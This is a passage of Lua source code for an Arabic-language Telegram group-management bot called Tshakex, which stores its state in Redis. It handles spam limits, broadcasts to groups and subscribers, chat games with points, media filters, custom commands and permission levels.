local type = redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
redis:setex(bot_id.."Tshakex:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.photo_ then  
if redis:get(bot_id.."Tshakex:Set:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) then 
if msg.content_.photo_.sizes_[3] then  
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ 
else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"• عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا") 
redis:del(bot_id.."Tshakex:Set:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
return false 
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"• ليس لدي صلاحية تغير معلومات المجموعه يرجى المحاوله لاحقا") 
redis:del(bot_id.."Tshakex:Set:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,"• تم تغير صورة المجموعه") 
end
end, nil) 
redis:del(bot_id.."Tshakex:Set:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
end   
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Tshakex:Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
print(text)
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n• تم الغاء الاذاعه للمجموعات") 
redis:del(bot_id.."Tshakex:Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = redis:smembers(bot_id.."Tshakex:ChekBotAdd") 
send(msg.chat_id_, msg.id_,"• تمت الاذاعه الى *- "..#list.." * مجموعه في البوت ")     
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
redis:set(bot_id..'Tshakex:Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
redis:set(bot_id..'Tshakex:Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
redis:set(bot_id..'Tshakex:Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
redis:set(bot_id..'Tshakex:Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
redis:del(bot_id.."Tshakex:Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Tshakex:Broadcasting:Users" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n• تم الغاء الاذاعه خاص") 
redis:del(bot_id.."Tshakex:Broadcasting:Users" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = redis:smembers(bot_id..'Tshakex:Num:User:Pv')  
send(msg.chat_id_, msg.id_,"• تمت الاذاعه الى *- "..#list.." * مشترك في البوت ")     
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ""))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
redis:del(bot_id.."Tshakex:Broadcasting:Users" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Tshakex:Broadcasting:Groups" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n• تم الغاء الاذاعه للمجموعات") 
redis:del(bot_id.."Tshakex:Broadcasting:Groups" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = redis:smembers(bot_id.."Tshakex:ChekBotAdd") 
send(msg.chat_id_, msg.id_,"• تمت الاذاعه الى *- "..#list.." * مجموعه في البوت ")     
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ""))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
redis:del(bot_id.."Tshakex:Broadcasting:Groups" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
if redis:get(bot_id.."BotTshakex:Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n〽┇تم الغاء الاذاعه للمجموعات") 
redis:del(bot_id.."BotTshakex:Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = redis:smembers(bot_id.."Tshakex:ChekBotAdd") 
send(msg.chat_id_, msg.id_,"☑┇تمت الاذاعه الى *- "..#list.." * مجموعه في البوت ")     
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
redis:set(bot_id..'BotTshakex:Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
redis:set(bot_id..'BotTshakex:Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
redis:set(bot_id..'BotTshakex:Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
redis:set(bot_id..'BotTshakex:Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
redis:del(bot_id.."BotTshakex:Broadcasting:Groups:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end



------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Tshakex:Broadcasting:Groups:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n• تم الغاء الاذاعه بالتوجيه للمجموعات") 
redis:del(bot_id.."Tshakex:Broadcasting:Groups:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = redis:smembers(bot_id.."Tshakex:ChekBotAdd")   
send(msg.chat_id_, msg.id_,"• تم التوجيه الى *- "..#list.." * مجموعه في البوت ")     
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
redis:del(bot_id.."Tshakex:Broadcasting:Groups:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
return false
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Tshakex:Broadcasting:Users:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n• تم الغاء الاذاعه بالترجيه خاص") 
redis:del(bot_id.."Tshakex:Broadcasting:Users:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
if msg.forward_info_ then 
local list = redis:smembers(bot_id.."Tshakex:Num:User:Pv")   
send(msg.chat_id_, msg.id_,"• تم التوجيه الى *- "..#list.." * مجموعه في البوت ")     
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end   
redis:del(bot_id.."Tshakex:Broadcasting:Users:Fwd" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
return false
end
if redis:get(bot_id.."Tshakex:Change:Name:Bot"..msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✖" then   
send(msg.chat_id_,msg.id_, "\n• تم الغاء امر تغير اسم البوت") 
redis:del(bot_id.."Tshakex:Change:Name:Bot"..msg.sender_user_id_) 
return false  
end 
redis:del(bot_id.."Tshakex:Change:Name:Bot"..msg.sender_user_id_) 
redis:set(bot_id.."Tshakex:Redis:Name:Bot",text) 
send(msg.chat_id_, msg.id_, "•  تم تغير اسم البوت الى - "..text)  
return false
end 
if redis:get(bot_id.."Tshakex:Redis:Id:Group"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_,msg.id_, "\n• تم الغاء امر تعين الايدي") 
redis:del(bot_id.."Tshakex:Redis:Id:Group"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
redis:del(bot_id.."Tshakex:Redis:Id:Group"..msg.chat_id_..""..msg.sender_user_id_) 
redis:set(bot_id.."Tshakex:Set:Id:Group"..msg.chat_id_,text:match("(.*)"))
send(msg.chat_id_, msg.id_,'• تم تعين الايدي الجديد')    
end
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Tshakex:Random:Sm"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Tshakex:Set:Sma"..msg.chat_id_) then
if not redis:get(bot_id.."Tshakex:Set:Sma"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n• لقد فزت في اللعبه \n• اللعب مره اخره وارسل - سمايل او سمايلات")
redis:incrby(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Tshakex:Set:Sma"..msg.chat_id_,true)
return false
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Tshakex:Klam:Speed"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Tshakex:Speed:Tr"..msg.chat_id_) then
if not redis:get(bot_id.."Tshakex:Speed:Tr"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n• لقد فزت في اللعبه \n• اللعب مره اخره وارسل - الاسرع او ترتيب")
redis:incrby(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Tshakex:Speed:Tr"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Tshakex:Klam:Hzor"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Tshakex:Set:Hzora"..msg.chat_id_) then
if not redis:get(bot_id.."Tshakex:Set:Hzora"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n• لقد فزت في اللعبه \n• اللعب مره اخره وارسل - حزوره")
redis:incrby(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Tshakex:Set:Hzora"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Tshakex:Maany"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Tshakex:Set:Maany"..msg.chat_id_) then
if not redis:get(bot_id.."Tshakex:Set:Maany"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n• لقد فزت في اللعبه \n• اللعب مره اخره وارسل - معاني")
redis:incrby(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Tshakex:Set:Maany"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Tshakex:Set:Aks:Game"..msg.chat_id_) or "").."" and not redis:get(bot_id.."Tshakex:Set:Aks"..msg.chat_id_) then
if not redis:get(bot_id.."Tshakex:Set:Aks"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"\n• لقد فزت في اللعبه \n• اللعب مره اخره وارسل - العكس")
redis:incrby(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Tshakex:Set:Aks"..msg.chat_id_,true)
end 
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Tshakex:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
send(msg.chat_id_, msg.id_,"• عذرآ لا يمكنك تخمين عدد اكبر من ال { 20 } خمن رقم ما بين ال{ 1 و 20 }\n")
return false 
end 
local GETNUM = redis:get(bot_id.."Tshakex:GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
redis:del(bot_id.."Tshakex:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)
redis:del(bot_id.."Tshakex:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
redis:incrby(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_,5)  
send(msg.chat_id_, msg.id_,"• مبروك فزت ويانه وخمنت الرقم الصحيح\n• تم اضافة { 5 } من النقاط \n")
elseif tonumber(NUM) ~= tonumber(GETNUM) then
redis:incrby(bot_id.."Tshakex:SADD:NUM"..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(redis:get(bot_id.."Tshakex:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)) >= 3 then
redis:del(bot_id.."Tshakex:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)
redis:del(bot_id.."Tshakex:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"• اوبس لقد خسرت في اللعبه \n• حظآ اوفر في المره القادمه \n• كان الرقم الذي تم تخمينه { "..GETNUM.." }")
else
send(msg.chat_id_, msg.id_,"• اوبس تخمينك غلط \n• ارسل رقم تخمنه مره اخرى ")
end
end
end
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Tshakex:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
send(msg.chat_id_, msg.id_,"• عذرا لا يوجد سواء { 6 } اختيارات فقط ارسل اختيارك مره اخرى\n")
return false 
end 
local GETNUM = redis:get(bot_id.."Tshakex:Games:Bat"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
redis:del(bot_id.."Tshakex:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"• مبروك فزت وطلعت المحيبس بل ايد رقم { "..NUM.." }\n• لقد حصلت على { 3 }من نقاط يمكنك استبدالهن برسائل ")
redis:incrby(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_,3)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
redis:del(bot_id.."Tshakex:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"• للاسف لقد خسرت \n• المحيبس بل ايد رقم { "..GETNUM.." }\n• حاول مره اخرى للعثور على المحيبس")
end
end
end
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Tshakex::Set:Moktlf"..msg.chat_id_) or "").."" then 
if not redis:get(bot_id.."Tshakex:Set:Moktlf:Bot"..msg.chat_id_) then 
redis:del(bot_id.."Tshakex::Set:Moktlf"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"\n• لقد فزت في اللعبه \n• اللعب مره اخره وارسل - المختلف")
redis:incrby(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Tshakex:Set:Moktlf:Bot"..msg.chat_id_,true)
end
------------------------------------------------------------------------------------------------------------
if text == ""..(redis:get(bot_id.."Tshakex:Set:Amth"..msg.chat_id_) or "").."" then 
if not redis:get(bot_id.."Tshakex:Set:Amth:Bot"..msg.chat_id_) then 
redis:del(bot_id.."Tshakex:Set:Amth"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"\n• لقد فزت في اللعبه \n• اللعب مره اخره وارسل - امثله")
redis:incrby(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_, 1)  
end
redis:set(bot_id.."Tshakex:Set:Amth:Bot"..msg.chat_id_,true)
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Tshakex:Add:msg:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
redis:del(bot_id.."Tshakex:id:user"..msg.chat_id_)  
send(msg.chat_id_,msg.id_, "\n• تم الغاء امر اضافة رسائل") 
redis:del(bot_id.."Tshakex:Add:msg:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
redis:del(bot_id.."Tshakex:Add:msg:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = redis:get(bot_id.."Tshakex:id:user"..msg.chat_id_)  
redis:del(bot_id.."Tshakex:Msg_User"..msg.chat_id_..":"..msg.sender_user_id_) 
redis:incrby(bot_id.."Tshakex:Num:Message:User"..msg.chat_id_..":"..iduserr,numadded)  
send(msg.chat_id_,msg.id_,"\n• تم اضافة له - "..numadded.." رسائل")  
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Tshakex:games:add" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
redis:del(bot_id.."Tshakex:idgem:user"..msg.chat_id_)  
send(msg.chat_id_,msg.id_, "\n• تم الغاء امر اضافة جواهر") 
redis:del(bot_id.."Tshakex:games:add" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
redis:del(bot_id.."Tshakex:games:add" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = redis:get(bot_id.."Tshakex:idgem:user"..msg.chat_id_)  
redis:incrby(bot_id.."Tshakex:Num:Add:Games"..msg.chat_id_..iduserr,numadded)  
send(msg.chat_id_,msg.id_,"\n• تم اضافة له - "..numadded.." نقاط")  
end
if text and redis:get(bot_id..'Tshakex:GetTexting:DevSlbotss'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء' or text == 'الغاء ✖' then 
redis:del(bot_id..'Tshakex:GetTexting:DevSlbotss'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'• تم الغاء حفظ كليشة مطور  ')
return false
end
redis:set(bot_id..'Tshakex:Texting:DevSlbotss',text)
redis:del(bot_id..'Tshakex:GetTexting:DevSlbotss'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'• تم حفظ كليشة مطور  ')
send(msg.chat_id_,msg.id_,text)
return false
end
if text and redis:get(bot_id..'Tshakex:Set:Cmd:Start:Bots') then
if text == 'الغاء' or text == 'الغاء ✖' then    
send(msg.chat_id_, msg.id_,"• تم الغاء حفظ كليشه امر /start") 
redis:del(bot_id..'Tshakex:Set:Cmd:Start:Bots') 
return false
end
redis:set(bot_id.."Tshakex:Set:Cmd:Start:Bot",text)  
send(msg.chat_id_, msg.id_,'• تم حفظ كليشه امر /start في البوت') 
redis:del(bot_id..'Tshakex:Set:Cmd:Start:Bots') 
return false
end
------------------------------------------------------------------------------------------------------
if text and not Vips(msg) then  
local Text_Filter = redis:get(bot_id.."Tshakex:Filter:Reply2"..text..msg.chat_id_)   
if Text_Filter then    
Send_Options(msg,msg.sender_user_id_,"reply","• "..Text_Filter)  
Delete_Message(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
if msg.content_.ID == 'MessageSticker' and not Owner(msg) then 
local filter = redis:smembers(bot_id.."filtersteckr"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.sticker_.set_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0, "•عذرا يا ⇠ [@"..data.username_.."]\n•  الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
else
send(msg.chat_id_,0, "•عذرا يا ⇠ ["..data.first_name_.."](T.ME/hlil3)\n• الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
Delete_Message(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end

------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Owner(msg) then 
local filter = redis:smembers(bot_id.."filterphoto"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.photo_.id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"•عذرا يا ⇠ [@"..data.username_.."]\n• الصوره التي ارسلتها تم منعها من المجموعه \n" ) 
else
send(msg.chat_id_,0,"•عذرا يا ⇠ ["..data.first_name_.."](T.ME/hlil3)\n• الصوره التي ارسلتها تم منعها من المجموعه \n") 
end
end,nil)   
Delete_Message(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Owner(msg) then 
local filter = redis:smembers(bot_id.."filteranimation"..msg.chat_id_)
for k,v in pairs(filter) do
if v == msg.content_.animation_.animation_.persistent_id_ then
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"•عذرا يا ⇠ [@"..data.username_.."]\n• المتحركه التي ارسلتها تم منعها من المجموعه \n") 
else
send(msg.chat_id_,0,"•عذرا يا ⇠ ["..data.first_name_.."](T.ME/hlil3)\n• المتحركه التي ارسلتها تم منعها من المجموعه \n" ) 
end
end,nil)   
Delete_Message(msg.chat_id_,{[0] = msg.id_})       
return false   
end
end
end
------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id.."Tshakex:Command:Reids:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
redis:set(bot_id.."Tshakex:Command:Reids:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"• ارسل الامر الجديد ليتم وضعه مكان القديم")  
redis:del(bot_id.."Tshakex:Command:Reids:Group"..msg.chat_id_..":"..msg.sender_user_id_)
redis:set(bot_id.."Tshakex:Command:Reids:Group:End"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id.."Tshakex:Command:Reids:Group:End"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = redis:get(bot_id.."Tshakex:Command:Reids:Group:New"..msg.chat_id_)
redis:set(bot_id.."Tshakex:Get:Reides:Commands:Group"..msg.chat_id_..":"..text,NewCmd)
redis:sadd(bot_id.."Tshakex:Command:List:Group"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"• تم حفظ الامر باسم ← { "..text..' }')  
redis:del(bot_id.."Tshakex:Command:Reids:Group:End"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if redis:get(bot_id.."Tshakex:Redis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
send(msg.chat_id_,msg.id_, "\n• تم الغاء امر اضافة صلاحيه") 
local CmdDel = redis:get(bot_id.."Tshakex:Add:Validity:Group:Rt:New"..msg.chat_id_..msg.sender_user_id_)  
redis:del(bot_id.."Tshakex:Add:Validity:Group:Rt"..CmdDel..msg.chat_id_)
redis:srem(bot_id.."Tshakex:Validitys:Group"..msg.chat_id_,CmdDel)  
redis:del(bot_id.."Tshakex:Redis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_,"\n• الاستخدام خطا رتبتك اقل من منشئ \n• تستطيع اضافة صلاحيات الاتيه فقط ← { عضو ، مميز  ، ادمن }") 
return false
end
end
if text == "ادمن" then
if not Owner(msg) then 
send(msg.chat_id_, msg.id_,"\n• الاستخدام خطا رتبتك اقل من مدير \n• تستطيع اضافة صلاحيات الاتيه فقط ← { عضو ، مميز }") 
return false
end
end
if text == "مميز" then
if not Admin(msg) then
send(msg.chat_id_, msg.id_,"\n• الاستخدام خطا رتبتك اقل من ادمن \n• تستطيع اضافة صلاحيات الاتيه فقط ← { عضو }") 
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = redis:get(bot_id.."Tshakex:Add:Validity:Group:Rt:New"..msg.chat_id_..msg.sender_user_id_)  
redis:set(bot_id.."Tshakex:Add:Validity:Group:Rt"..textn..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, "\n• تم اضافة الصلاحيه باسم ← { "..textn..' }') 
redis:del(bot_id.."Tshakex:Redis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
------------------------------------------------------------------------------------------------------------
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = redis:get(bot_id.."Tshakex:Text:Manager"..msg.sender_user_id_..":"..msg.chat_id_.."")
if redis:get(bot_id.."Tshakex:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
redis:del(bot_id.."Tshakex:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_)
if msg.content_.sticker_ then   
redis:set(bot_id.."Tshakex:Add:Rd:Manager:Stekrs"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
redis:set(bot_id.."Tshakex:Add:Rd:Manager:Vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
redis:set(bot_id.."Tshakex:Add:Rd:Manager:Gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
redis:set(bot_id.."Tshakex:Add:Rd:Manager:Text"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
redis:set(bot_id.."Tshakex:Add:Rd:Manager:Audio"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
redis:set(bot_id.."Tshakex:Add:Rd:Manager:File"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
redis:set(bot_id.."Tshakex:Add:Rd:Manager:Video"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
